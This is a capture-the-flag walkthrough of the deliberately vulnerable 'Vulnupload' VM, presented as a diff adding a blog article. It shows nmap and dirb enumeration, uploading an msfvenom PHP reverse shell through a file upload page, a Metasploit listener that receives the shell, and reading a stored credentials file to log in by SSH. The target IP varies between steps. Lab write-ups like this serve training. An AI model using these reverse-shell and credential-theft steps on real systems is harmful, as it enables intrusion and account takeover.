@@ -1,0 +1,45 @@
+
+Hack the Vulnupload VM (CTF Challenge)
+
+Hello friends! Today we are going to take another CTF challenge known as Vulnupload. The credit for making this vm machine goes to “Mohammad Khreesha” and it is another capture the flag challenge in which our goal is to capture all the flags to complete the challenge. You can download this VM here.
+Let’s Breach!!!
+Let us start form getting to know the IP of VM (Here, I have it at 192.168.1.102 but you will have to find your own)
+netdiscover
+
+Use nmap for port enumeration
+nmap -p- -A 192.168.1.102 —open
+
+Nmap scan tells us that port 22 and 80 are open,as port 80 is running http we open it in our browser. When we open the ip we find a login page we use dirb to enumerate the directories and found 2 important directories called /flag/ and /admin_area/
+dirb http://192.168.0.26/
+
+We first open the flag directory and find the 1st flag.
+
+Then we open the directory called /admin_area/.
+
+The page itself doesn’t tell much but when we take a look at the source code we find our 2nd flag and the username and password to login through the home page.
+
+When we login through the home page, we find a page that can be used to upload files.
+
+We create a php reverse shell payload using msfvenom and upload it to our target machine.
+
+Now dirb scan showed us a page called uploaded_files we use an educated guess and execute our file in that directory.
+
+Now we setup our listener before executing our shell. As soon as we execute our shell we will get the reverse shell of the target system.
+msf > use multi/handler
+msf exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
+msf exploit(multi/handler) > set lhost 192.168.0.18
+msf exploit(multi/handler) > set lport 4444
+msf exploit(multi/handler) > run
+
+Now we find a file called hint.txt, when we open it we find our 3rd flag.
+
+We find all the files that belong to user technawi, and we find a file called crendtials.txt in /etc/mysql/conf.d/credentials.txt
+
+When we open the file we get our 4th flag and the password for user technawi.
+
+Now we login through ssh using these credentials in the target machine.
+ssh technawi@192.168.0.26
+
+Now we open the file called flag.txt and find our 5th and final flag.
+
+Author: Sayantan Bera is a technical writer at hacking articles and cyber security enthusiast. Contact Here
